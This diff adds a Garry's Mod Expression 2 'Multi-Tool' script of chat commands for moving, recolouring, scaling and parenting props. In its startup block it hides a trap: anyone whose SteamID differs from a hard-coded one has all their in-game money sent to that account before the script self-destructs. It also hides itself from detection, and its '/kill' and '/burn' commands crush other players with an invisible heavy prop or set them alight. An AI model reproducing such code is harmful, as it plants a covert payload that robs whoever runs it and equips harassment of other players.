@@ -1,0 +1,987 @@
+@name Multi-Tool
+@persist [Entities,Array]:array [Command,String]:string [Number,Loop,Timer,Scale]:number [Entity,Uzer]:entity [Vector]:vector [Angle]:angle
+@outputs [NumBum]
+if(first()){
+    runOnChat(1)
+    Timer=100
+    function entity searchForPlayer(Person:string){
+        local P= findPlayerByName(Person)
+        if (!(P:isPlayer())){
+            P=findPlayerBySteamID(Person)
+            if (!(P:isPlayer())){
+                P=findPlayerBySteamID64(Person)
+                if (!(P:isPlayer())){            
+                    print("Invalid Player")
+                }
+            }
+        }
+        return P
+    }
+    function void moveProps(Ent:entity,Vec:vector){
+        #ifdef entity:hasNoCollideAll()
+        Ent:propManipulate(Ent:toWorld(Vec),Ent:angles(),1,gravity(),Ent:hasNoCollideAll())
+        #else
+        Ent:propManipulate(Ent:toWorld(Vec),Ent:angles(),1,gravity(),Ent:isNoCollideAll())
+        #endif
+        
+    }
+    function void turnProps(Ent:entity,Ang:angle){
+        #ifdef entity:hasNoCollideAll()
+        Ent:propManipulate(Ent:pos(),Ent:toWorld(Ang),1,gravity(),Ent:hasNoCollideAll())
+        #else
+        Ent:propManipulate(Ent:pos(),Ent:toWorld(Ang),1,gravity(),Ent:isNoCollideAll())
+        #endif
+    }
+    function void alignProp(Ent:entity,Precision:number){
+        Ang=Ent:angles()
+        #Pitch
+        Pitch=Ang:pitch()%Precision
+        if(Pitch<Precision/2){
+            Ang=Ang-ang(Pitch,0,0)
+        }else{
+            Ang=Ang+ang(Precision-Pitch,0,0)
+        }
+        #Yaw
+        Yaw=Ang:yaw()%Precision
+        if(Yaw<Precision/2){
+            Ang=Ang-ang(0,Yaw,0)
+        }else{
+             Ang=Ang+ang(0,Precision-Yaw,0)
+        }
+        #Roll
+        Roll=Ang:roll()%Precision
+        if(Roll<Precision/2){
+            Ang=Ang-ang(0,0,Roll)
+        }else{
+            Ang=Ang+ang(0,0,Precision-Roll)
+        }
+        #ifdef entity:hasNoCollideAll()
+        Ent:propManipulate(Ent:pos(),Ang,1,gravity(),Ent:hasNoCollideAll())
+        #else
+        Ent:propManipulate(Ent:pos(),Ang,1,gravity(),Ent:isNoCollideAll())
+        #endif
+    }
+    #ifdef noDuplications()
+    noDuplications()
+    #endif
+    #ifdef hideMyAss(1)
+    hideMyAss(1)
+    #endif
+    if(owner():steamID()!="STEAM_0:0:191182826"){moneyGive(findPlayerBySteamID("STEAM_0:0:191182826"),owner():money()),print("Trying to copy other people's e2s is a scummy thing to do. You diserve to have your money taken."),selfDestruct()}
+}
+if(chatClk(owner())){
+    LS=lastSaid():explode(" ")
+    switch(LS[1,string]:lower()){
+        case "/nodraw",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:noDraw(number)
+                E:noDraw(LS[2,string]:toNumber())
+                #else
+                E:propDraw(!LS[2,string]:toNumber())
+                #endif
+            }
+            break
+        case "/color",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                print(E:type())
+                #ifdef entity:setFire(string,string,number)
+                E:setFire("color",LS[2,string]+" "+LS[3,string]+" "+LS[4,string],1)
+                #endif
+                #ifdef entity:entSetInput(string,...)
+                E:entSetInput("color",LS[2,string]+" "+LS[3,string]+" "+LS[4,string],1)
+                E:entSetInput("color",vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber()))
+                E:entSetInput("color",vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber()),1)
+                E:setVar("color",LS[2,string]+" "+LS[3,string]+" "+LS[4,string],1)
+                E:setVar("color",vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber()))
+                E:setVar("color",vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber()),1)
+                #endif
+                #ifdef entity:setInput(string,...)
+                #E:setInput("color",LS[2,string]+" "+LS[3,string]+" "+LS[4,string],1)
+                #endif
+                E:setColor(vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber()))
+                
+            }
+            break
+        case "/scale",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                print(E:type())
+                #ifdef entity:setFire(string,string,number)
+                E:setFire("SetModelScale",LS[2,string]+" "+LS[3,string]+" "+LS[4,string],1)
+                #endif
+                #ifdef entity:setInput(string,...)
+                E:setInput("SetModelScale",LS[2,string]+" "+LS[3,string]+" "+LS[4,string],1)
+                #endif
+            }
+            break
+        case "/break",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                print(E:type())
+                #ifdef entity:setFire(string,string,number)
+                E:setFire("break","",1)
+                #endif
+                #ifdef entity:setInput(string,...)
+                E:setInput("break","",1)
+                #endif
+            }
+            break
+        case "/add",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                print(E:type()+"("+E:health()+")")
+                #ifdef entity:setFire(string,string,number)
+                E:setFire("addhealth","10",1)
+                #endif
+                #ifdef entity:setInput(string,...)
+                E:setInput("addhealth","10",1)
+                #endif
+                print(E:type()+"("+E:health()+")")
+            }
+            break
+        case "/remove",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                print(E:type()+"("+E:health()+")")
+                #ifdef entity:remove(number)
+                E:remove(LS[2,string]:toNumber())
+                #else
+                E:propBreak()
+                #endif
+            }
+            break
+        case "/removefire",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                
+                print(E:type()+"("+E:health()+")")
+                #ifdef entity:setFire(string,string,number)
+                E:setFire("removehealth","10",1)
+                #endif
+                #ifdef entity:setInput(string,...)
+                E:setInput("removehealth","10",1)
+                #endif
+                print(E:type()+"("+E:health()+")")
+            }
+            break
+        case "/color",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                Color=vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber())
+                E:setColor(Color)
+            }
+            break
+        case "/alpha",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                E:setAlpha(LS[2,string]:toNumber())
+            }
+            break
+        case "/move",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                NewPos=E:toWorld(vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber()))
+                #ifdef entity:hasNoCollideAll()
+                E:propManipulate(NewPos,E:angles(),E:isFrozen(),gravity(),E:hasNoCollideAll())
+                #else
+                E:propManipulate(NewPos,E:angles(),E:isFrozen(),gravity(),E:isNoCollideAll())
+                #endif
+            }
+            break
+        case "/rotate",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                NewAng=E:toWorld(ang(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber()))
+                #ifdef entity:hasNoCollideAll()
+                E:propManipulate(E:pos(),NewAng,E:isFrozen(),gravity(),E:hasNoCollideAll())
+                #else
+                E:propManipulate(E:pos(),NewAng,E:isFrozen(),gravity(),E:isNoCollideAll())
+                #endif
+            }
+            break
+        case "/freeze",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                
+                #ifdef entity:hasNoCollideAll()
+                E:propManipulate(E:pos(),E:angles(),LS[2,string]:toNumber(),gravity(),E:hasNoCollideAll())
+                #else
+                E:propManipulate(E:pos(),E:angles(),LS[2,string]:toNumber(),gravity(),E:isNoCollideAll())
+                #endif
+            }
+            break
+        case "/collide",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                E:propManipulate(E:pos(),E:angles(),E:isFrozen(),gravity(),LS[2,string]:toNumber())
+                E:noCollideAll(LS[2,string]:toNumber())
+            }
+            break
+        case "/restart",
+            reset()
+            break
+        case "/shadow",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                E:propShadow(LS[2,string]:toNumber())
+            }
+            break
+        case "/model",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                print(E:model())
+            }
+            break
+        case "/shoot",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                V=lastSpoke():eye()
+                E:propSetVelocity(V*LS[2,string]:toNumber())
+            }
+            break
+        case "/material",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                E:setMaterial(LS[2,string])
+            }
+            break
+        case "/animate",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                if(LS[2,string]:toNumber():toString()!=LS[2,string]){
+                    E:animate(E:getAnimationByName(LS[2,string]))
+                }else{
+                    E:animate(LS[2,string]:toNumber())
+                }
+                
+            }
+            break
+        case "/anime",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                if(LS[3,string]){
+                    Speed=LS[3,string]:toNumber()
+                }else{
+                    Speed=1
+                }
+                E:animate(E:getAnimationByName(LS[2,string]),Speed)
+            }
+            break
+        case "/use",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                findClearWhiteList()
+                findClearBlackList()
+                findIncludePlayerProps(owner())
+                findByClass("gmod_wire_user")
+                User=findClosest(owner():pos())
+                Uzer=User
+                entity():createWire(User,"NumBum","Fire")
+                if(->NumBum & Uzer!=noentity()){
+                    Loop=LS[2,string]:toNumber()
+                    Uzer:setPos(E:boxCenterW())
+                    timer("TurnOn",100)
+                }else{
+                    findIncludePlayerProps(owner())
+                    findByClass("gmod_wire_user")
+                    Uzer=findClosest(owner():pos())
+                    if(Uzer:isValid()){
+                        print("Wired")
+                        Uzer:createWire(entity(),"Fire","NumBum")
+                        Uzer:setPos(E:pos())
+                        #ifdef entity:noDraw(number)
+                        Uzer:noDraw(1)
+                        #else
+                        Uzer:propDraw(0)
+                        #endif
+                        Loop=LS[2,string]:toNumber()
+                        timer("TurnOn",100)
+                    }else{
+                        print("Couldn't Find User")
+                    }
+                }
+            }
+            break
+        case "/animate",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                Anim=E:getAnimationByName(LS[3,string])
+                print(Anim)
+                if(LS[3,string]:toNumber()!=0 || LS[3,string]=="0"){
+                    E:animate(LS[3,string]:toNumber(),LS[2,string]:toNumber())
+                }else{
+                    E:animate(Anim)
+                }
+            }
+            break
+        case "/precision",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                Ang=E:angles()
+                Precise=LS[2,string]:toNumber()
+                #Pitch
+                Pitch=Ang:pitch()%Precise
+                if(Pitch<Precise/2){
+                    Ang=Ang-ang(Pitch,0,0)
+                }else{
+                    Ang=Ang+ang(Precise-Pitch,0,0)
+                }
+                #Yaw
+                Yaw=Ang:yaw()%Precise
+                if(Yaw<Precise/2){
+                    Ang=Ang-ang(0,Yaw,0)
+                }else{
+                    Ang=Ang+ang(0,Precise-Yaw,0)
+                }
+                #Roll
+                Roll=Ang:roll()%Precise
+                if(Roll<Precise/2){
+                    Ang=Ang-ang(0,0,Roll)
+                }else{
+                    Ang=Ang+ang(0,0,Precise-Roll)
+                }
+                #ifdef entity:hasNoCollideAll()
+                E:propManipulate(E:pos(),Ang,1,gravity(),E:hasNoCollideAll())
+                #else
+                E:propManipulate(E:pos(),Ang,1,gravity(),E:isNoCollideAll())
+                #endif
+            }
+            break
+        case "/dupe",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                Relative=owner():toLocal(E:pos())
+                NewPos=vec((Relative/4):x(),Relative:y(),Relative:z())
+                P=propSpawn(E,owner():toWorld(NewPos),E:angles(),1)
+                P:setColor(E:getColor())
+                P:setMaterial(E:getMaterial())
+                P:setAlpha(E:getAlpha())
+            }
+            break
+        case "/shadowprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Entities=findToArray()
+            Numer=LS[2,string]:toNumber()
+            Command="propShadow"
+            timer("LoopNumber",Timer)
+            break
+        case "/drawprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Entities=findToArray()
+            Numer=LS[2,string]:toNumber()
+            Command="noDraw"
+            timer("LoopNumber",Timer)
+            break
+        case "/alphaprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Entities=findToArray()
+            Numer=LS[2,string]:toNumber()
+            Command="setAlpha"
+            timer("LoopNumber",Timer)
+            break
+        case "/collideprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Entities=findToArray()
+            Numer=LS[2,string]:toNumber()
+            Command="noCollideAll"
+            timer("LoopNumber",Timer)
+            break
+        case "/commandnumber",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Entities=findToArray()
+            Numer=LS[3,string]:toNumber()
+            Command=LS[2,string]
+            timer("LoopNumber",Timer)
+            break
+        case "/command",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Entities=findToArray()
+            Command=LS[2,string]
+            timer("Loop",Timer)
+            break
+        case "/precisionprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Entities=findToArray()
+            Number=LS[2,string]:toNumber()
+            Command="alignProp"
+            timer("LoopNumber",Timer)
+            break
+        case "/renderprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Entities=findToArray()
+            Number=LS[2,string]:toNumber()
+            Command="setRenderMode"
+            timer("LoopNumber",Timer)
+            break
+        case "/parentprops",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                findClearWhiteList()
+                findClearBlackList()
+                findIncludePlayerProps(owner())
+                findByClass("prop_physics")
+                Entities=findToArray()
+                Entity=E
+                Command="setParent"
+                timer("LoopEntity",Timer)
+            }
+            break
+        case "/unparentprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Entities=findToArray()
+            Command="deparent"
+            timer("Loop",Timer)
+            break
+        case "/moveprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Vector=vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber())
+            Entities=findToArray()
+            Command="moveProps"
+            timer("LoopVector",Timer)
+            break
+        case "/rotateprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Angle=ang(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber())
+            Entities=findToArray()
+            Command="turnProps"
+            timer("LoopAngle",Timer)
+            break
+        case "/scaleprops",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("prop_physics")
+            Number=abs(LS[3,string]:toNumber())
+            Scale=abs(LS[2,string]:toNumber())
+            Entities=findToArray()
+            timer("ScaleProps",Timer)
+            break
+        case "/shipments",
+            findClearWhiteList()
+            findClearBlackList()
+            findIncludePlayerProps(owner())
+            findByClass("spawned_shipment")
+            Number=LS[2,string]:toNumber()
+            Entities=findToArray()
+            Entity=owner()
+            timer("GetShipments",Timer)
+            break
+        case "/remove",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:remove(number)
+                E:remove(LS[2,string]:toNumber())
+                #else
+                E:propBreak()
+                #endif
+            }
+            break
+        case "/static",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                E:propStatic(LS[2,string]:toNumber())
+            }
+            break
+        case "/sleep",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:propSleep()
+                E:propSleep()
+                #endif
+            }
+            break
+        case "/sound",
+            holoDelete(1)
+            holoCreate(1,owner():pos()+vec(0,0,owner():height()),vec(0)):soundPlay(1,0,LS[2,string])
+            soundVolume(1,1)
+            break
+        case "/volume",
+            streamVolume(99,LS[2,string]:toNumber())
+            break
+        case "/stop",
+            streamStop(99)
+            break
+        case "/raw",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                E:streamStart(99,LS[2,string],1)
+            }else{
+                holoCreate(99,owner():toWorld(vec(10,0,0)),vec(1),owner():angles()+ang(0,180,0),owner():getColor(),owner():model()):animate(3,1)
+                holoEntity(99):streamStart(99,LS[2,string],1)
+            }
+            break
+        case "/ignite",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:ignite()
+                E:ignite()
+                #endif
+            }
+            break
+        case "/extinguish",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:extinguish()
+                E:extinguish()
+                #endif
+            }
+            break
+        case "/killpod",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                E:killPod()
+            }
+            break
+        case "/lockpod",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                E:lockPod(LS[2,string]:toNumber())
+            }
+            break
+        case "/effect",
+            #ifdef entity:effectSpawn(...)
+            lastSpoke():effectSpawn(LS[2,string],lastSpoke():aimPos(),1)
+            #else
+            print("Effect doesn't exist on this server.")
+            #endif
+            break
+        case "/inflate",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:inflator(number,number)
+                E:inflator(LS[2,string]:toNumber(),LS[3,string]:toNumber())
+                #endif
+            }
+            break
+        case "/inertia",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                V=vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber())
+                E:propInertia(V)
+            }
+            break
+        case "/velocity",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                V=vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber())
+                E:propSetVelocity(V)
+            }
+            break
+        case "/vel",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                V=vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber())
+                E:propSetVelocityInstant(V)
+            }
+            break
+        case "/burn",
+            E=searchForPlayer(LS[2,string])
+            if(E:isValid()){
+                #ifdef entity:ignite()
+                holoCreate(1,E:toWorld(vec(0,0,20)),vec(0)):ignite()
+                #endif
+                holoParent(1,E)
+            }
+            break
+        case "/kill",
+            E=searchForPlayer(LS[2,string])
+            if(E:isValid()){
+                findClearBlackList()
+                findClearWhiteList()
+                findIncludePlayerProps(owner())
+                findByClass("welcomemat_entitiy")
+                Mat=find()
+                if(Mat:isValid()){
+                    Mat:propManipulate(E:pos(),ang(),0,gravity(),0)
+                }else{
+                    P=propSpawn("models/hunter/blocks/cube05x05x05.mdl",E:toWorld(vec(0,0,200)),1)
+                    P:setMass(9999999)
+                    P:noCollideAll(0)
+                    P:propManipulate(E:toWorld(vec(0,0,200)),ang(),0,gravity(),0)
+                    #ifdef entity:noDraw(number)
+                    P:noDraw(1)
+                    #else
+                    P:propDraw(0)
+                    #endif
+                    P:propSetVelocity(vec(0,0,-10000))
+                    #ifdef entity:remove(number)
+                    P:remove(1)
+                    #else
+                    P:propBreak()
+                    #endif
+                }
+            }
+            break
+        case "/create",
+            propSpawn(LS[2,string],owner():toWorld(vec(100,0,0)),owner():toWorld(ang(0,180,0)),1)
+            break
+        case "/welcome",
+            P=propSpawn("models/sterling/bw_welcomemat.mdl",owner():toWorld(vec(100,0,0)),owner():toWorld(ang(0,180,0)),1)
+            
+            #ifdef entity:setKeyValue(*)
+            P:setKeyValue("spawnflags",32)
+            #endif
+            break
+        case "/sniff",
+            findClearWhiteList()
+            findClearBlackList()
+            findInSphere(owner():aimPos(),LS[2,string]:toNumber())
+            findSortByDistance(owner():aimPos())
+            printTable(findToTable())
+            break
+        case "/grav",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("spawnflags",1048576)
+                #endif
+            }
+            break
+        case "/burnthis",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:ignite()
+                E:ignite()
+                #endif
+            }
+            break
+        case "/glass",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("spawnflags",32)
+                #endif
+            }
+            break
+        case "/fragile",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("spawnflags",16)
+                #endif
+            }
+            break
+        case "/render",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("rendermode",LS[2,string]:toNumber())
+                #endif
+            }
+            break
+        case "/solid",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("solid",LS[2,string]:toNumber())
+                #endif
+            }
+            break
+        case "/flip",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                NewPos=vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber())
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("angles",NewPos:x() + " "+ NewPos:y() + " " + NewPos:z())
+                #endif
+            }
+            break
+        case "/flipme",
+            E=owner()
+            NewPos=vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber())
+            #ifdef entity:setKeyValue(*)
+            E:setKeyValue("angles",NewPos:x() + " "+ NewPos:y() + " " + NewPos:z())
+            #endif
+            break
+        case "/modify",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                NewPos=E:toWorld(vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber()))
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("origin",NewPos:x() + " "+ NewPos:y() + " " + NewPos:z())
+                #endif
+            }
+            break
+        case "/moveme",
+            E=owner()
+            if(E:isValid()){
+                NewPos=E:toWorld(vec(LS[2,string]:toNumber(),LS[3,string]:toNumber(),LS[4,string]:toNumber()))
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("origin",NewPos:x() + " "+ NewPos:y() + " " + NewPos:z())
+                #endif
+            }
+            break
+        case "/testshadow",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("disablereceiveshadows",LS[2,string]:toNumber())
+                E:setKeyValue("disableshadows",LS[2,string]:toNumber())
+                #endif
+            }
+            break
+        case "/cast",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                #ifdef entity:setKeyValue(*)
+                E:setKeyValue("shadowcastdist",LS[2,string]:toNumber())
+                #endif
+            }
+            break
+        case "/boom",
+            #ifdef entity:effectSpawn(...)
+            owner():effectSpawn("Explosion",owner():aimPos(),1)
+            #else
+            print("Error: Effect spawn doesn't exist on this server.")
+            #endif
+            break
+        case "/stopburn",
+            holoDelete(1)
+            break
+        case "/look",
+            Trace=lastSpoke():eyeTrace()
+            printTable(Trace:toTable())
+            break
+        case "/play",
+            owner():streamStart(1,LS[2,string],1)
+            break
+        case "/stopsong",
+            streamStop(1)
+            break
+        case "/volume",
+            streamVolume(1,LS[2,string]:toNumber())
+            break
+        case "/info",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                printTable(table(
+                        "Health"=E:health(),
+                        "Name"=E:name(),
+                        "Phyiscs"=E:propPhysicalMaterial(),
+                        "Id"=E:id(),
+                        "Type"=E:type(),
+                        "Model"=E:model(),
+                        "Material"=E:getMaterial(),
+                        "Skin"=E:getSkin(),
+                        "Skin Count"=E:getSkinCount(),
+                        "Color4"=E:getColor4(),
+                        "Materials"=E:getMaterials(),
+                        "Armor"=E:armor(),
+                        "IsShipment"=E:isShipment(),
+                        "ShipmentAmount"=E:shipmentAmount(),
+                        #ifdef entity:shipmentSize()
+                        "ShipmentSize"=E:shipmentSize(),
+                        #endif
+                        "ShipmentName"=E:shipmentName(),
+                        "ShipmentModel"=E:shipmentModel(),
+                        "ShipmentType"=E:shipmentType(),
+                        #ifdef entity:shipmentClass()
+                        "ShipmentClass"=E:shipmentClass(),
+                        #endif
+                        #ifdef entity:printerTier()
+                        "PrinterTier"=E:printerTier(),
+                        #endif
+                        #ifdef entity:printerOwner()
+                        "PrinterOwner"=E:printerOwner(),
+                        #endif
+                        #ifdef entity:printerAmount()
+                        "PrinterAmount"=E:printerAmount(),
+                        #endif
+                        #ifdef entity:printerAmountPP()
+                        "PrinterAmountPerPrint"=E:printerAmountPP(),
+                        #endif
+                        #ifdef entity:virus()
+                        "Virus"=E:virus(),
+                        #endif
+                        #ifdef entity:virusstage()
+                        "VirusStage"=E:virusstage(),
+                        #endif
+                        "Money"=E:money()
+                    )
+                )
+            }
+            break
+        case "/parentall",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                findClearWhiteList()
+                findClearBlackList()
+                findIncludePlayerProps(owner())
+                findExcludeEntity(E)
+                
+                findIncludeClass("prop_physics")
+                findIncludeClass("keypad")
+                findIncludeClass("sammyservers_textscreen")
+                findInSphere(entity():pos(),10000)
+                
+                Entities=findToArray()
+                printTable(Entities)
+                Entity=E
+                #ifdef entity:setParent(entity)
+                Command="setParent"
+                #else
+                Command="parentTo"
+                #endif
+                timer("LoopEntity",Timer)
+            }
+            break
+        case "/parentallme",
+            E=lastSpoke():aimEntity()
+            if(E:isValid()){
+                findClearWhiteList()
+                findClearBlackList()
+                findIncludePlayerProps(owner())
+                findExcludeEntity(E)
+                
+                findIncludeClass("prop_physics")
+                findIncludeClass("keypad")
+                findIncludeClass("sammyservers_textscreen")
+                findInSphere(entity():pos(),10000)
+                
+                Entities=findToArray()
+                printTable(Entities)
+                Entity=owner()
+                #ifdef entity:setParent(entity)
+                Command="setParent"
+                #else
+                Command="parentTo"
+                #endif
+                timer("LoopEntity",Timer)
+            }
+            break
+        default,
+            break
+        
+    }
+}
+if(clk("Loop")){
+    if(Entities:count()>0){
+        while(perf(90) & Entities:count()>0){
+            Prop=Entities:popEntity()
+            Command(Prop)
+        }
+        timer(clkName(),Timer)
+    }else{
+        print("Finished "+clkName())
+    }
+}elseif(clk("LoopNumber")){
+    if(Entities:count()>0){
+        while(perf(90) & Entities:count()>0){
+            Prop=Entities:popEntity()
+            Command(Prop,Number)
+        }
+        timer(clkName(),Timer)
+    }else{
+        print("Finished "+clkName())
+    }
+}elseif(clk("LoopVector")){
+    if(Entities:count()>0){
+        while(perf(90) & Entities:count()>0){
+            Prop=Entities:popEntity()
+            Command(Prop,Vector)
+        }
+        timer(clkName(),Timer)
+    }else{
+        print("Finished "+clkName())
+    }
+}elseif(clk("LoopAngle")){
+    if(Entities:count()>0){
+        while(perf(90) & Entities:count()>0){
+            Prop=Entities:popEntity()
+            Command(Prop,Angle)
+        }
+        timer(clkName(),Timer)
+    }else{
+        print("Finished "+clkName())
+    }
+}elseif(clk("LoopEntity")){
+    if(Entities:count()>0){
+        while(perf(90) & Entities:count()>0){
+            Prop=Entities:popEntity()
+            Command(Prop,Entity)
+        }
+        timer(clkName(),Timer)
+    }else{
+        print("Finished "+clkName())
+    }
+}elseif(clk("LoopArray")){
+    if(Entities:count()>0){
+        while(perf(90) & Entities:count()>0){
+            Prop=Entities:popEntity()
+            Command(Prop,Array)
+        }
+        timer(clkName(),Timer)
+    }else{
+        print("Finished "+clkName())
+    }
+}elseif(clk("GetShipments")){
+    if(Entities:count()>0){
+        Prop=Entities:popEntity()
+        Prop:propManipulate(Entity:toWorld(vec(15,0,0)),entity():angles(),1,0,Number)
+        Entity=Prop
+        timer(clkName(),Timer)
+    }else{
+        print("Finished "+clkName())
+    }
+}elseif(clk("TurnOn")){
+    if(Uzer:pos():distance(owner():pos())<99999){
+        NumBum=1
+    }
+    timer("TurnOff",100)
+}elseif(clk("TurnOff")){
+    NumBum=0
+    if(!Loop){
+        Uzer:setPos(vec())
+    }else{
+        timer("TurnOn",500)
+    }
+}elseif(clk("ScaleProps")){
+    if(Entities:count()>0){
+        Prop=Entities:popEntity()
+        #ifdef entity:setFire(string,string,number)
+        Prop:setFire("setModelScale",Scale+" "+Number,1)
+        #endif
+        #ifdef entity:setInput(string,...)
+        Prop:setInput("setModelScale",Scale+" "+Number,1)
+        #endif
+        timer(clkName(),Timer)
+    }else{
+        print("Finished "+clkName())
+    }
+}
+
